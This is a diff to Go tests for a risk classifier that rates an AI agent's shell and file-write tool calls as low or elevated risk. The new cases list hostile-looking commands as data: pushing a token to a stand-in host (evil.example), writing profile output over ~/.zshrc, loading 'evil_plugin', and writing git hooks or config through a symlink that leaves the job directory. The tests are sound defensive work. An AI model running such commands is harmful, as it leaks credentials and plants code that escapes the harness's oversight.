@@ -1,6 +1,8 @@
 package risk
 
 import (
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 )
@@ -110,7 +112,34 @@ func TestRespellingsAndUnknownShapes(t *testing.T) {
 		{`git fetch https://evil.example/TOKEN`, Elevated},
 		{`git fetch git@evil.example:x/y.git`, Elevated},
 		{`git fetch ../other`, Elevated},
+		// R9-S9, as written in the review.
+		{`env -C ~/Developer/be git commit -am x`, Elevated},
+		{`env --chdir=/etc ls`, Elevated},
+		{`env --chdir /etc ls`, Elevated},
+		{`git remote add show https://evil.example/TOKEN`, Elevated},
+		{`git remote set-url origin https://evil.example/x`, Elevated},
+		{`git branch -vD develop`, Elevated},
+		{`git switch -fc x`, Elevated},
+		{`go test -coverprofile=/Users/x/.zshrc ./...`, Elevated},
+		{`go test -cpuprofile /tmp/x ./...`, Elevated},
+		{`go test -trace=/tmp/t ./...`, Elevated},
+		{`go test --coverprofile=/tmp/x ./...`, Elevated},
+		{`go test -test.coverprofile=/tmp/x ./...`, Elevated},
+		{`pytest -p evil_plugin`, Elevated},
+		{`pytest --basetemp=/Users/x/Documents`, Elevated},
+		{`rg --hostname-bin=./x foo`, Elevated},
+		{`sort --out=/Users/x/.zshrc list`, Elevated},
+		{`sort --outp=/Users/x/.zshrc list`, Elevated},
 		// … and their ordinary neighbours stay low.
+		{`git remote -v`, Low},
+		{`git remote show origin`, Low},
+		{`git remote get-url origin`, Low},
+		{`git branch -v`, Low},
+		{`git switch -c fix/z`, Low},
+		{`go test -cover ./...`, Low},
+		{`go test -json ./...`, Low},
+		{`pytest -q tests/`, Low},
+		{`env CI=1 go test ./...`, Low},
 		{`git fetch`, Low},
 		{`git fetch origin`, Low},
 		{`git fetch --prune origin main`, Low},
@@ -152,6 +181,41 @@ func TestRespellingsAndUnknownShapes(t *testing.T) {
 		}
 		if got.Level != Low && len(got.Reasons) == 0 {
 			t.Errorf("%q: %s with no reason", c.command, got.Level)
+		}
+	}
+}
+
+// R9-S9: a link committed inside the job's directory that points outside it does not make a
+// write through it "inside", and the repository's own .git under the root is outside (a hook or
+// the config written there runs on the next low git command).
+func TestLinksAndGitDirInsideTheRootAreOutside(t *testing.T) {
+	root := t.TempDir()
+	outside := t.TempDir()
+	if err := os.Symlink(outside, filepath.Join(root, "link")); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Join(root, ".git", "hooks"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	ctx := Context{JobRoot: root}
+	cases := []struct {
+		tool  string
+		input map[string]any
+		want  Level
+	}{
+		{"Bash", map[string]any{"command": "touch link/x"}, Elevated},
+		{"Bash", map[string]any{"command": "mkdir -p link/a"}, Elevated},
+		{"Bash", map[string]any{"command": "cd link && git commit -am x"}, Elevated},
+		{"Write", map[string]any{"file_path": filepath.Join(root, "link", "x.go"), "content": "c"}, Elevated},
+		{"Write", map[string]any{"file_path": filepath.Join(root, ".git", "hooks", "pre-commit"), "content": "c"}, Elevated},
+		{"Edit", map[string]any{"file_path": filepath.Join(root, ".git", "config")}, Elevated},
+		{"Bash", map[string]any{"command": "touch src/x.go"}, Low},
+		{"Write", map[string]any{"file_path": filepath.Join(root, "src", "x.go"), "content": "c"}, Low},
+		{"Write", map[string]any{"file_path": filepath.Join(root, ".github", "ci.yml"), "content": "c"}, Low},
+	}
+	for _, c := range cases {
+		if got := Default().Classify(c.tool, input(t, c.input), ctx); got.Level != c.want {
+			t.Errorf("%s %v: %s %v, want %s", c.tool, c.input, got.Level, got.Reasons, c.want)
 		}
 	}
 }
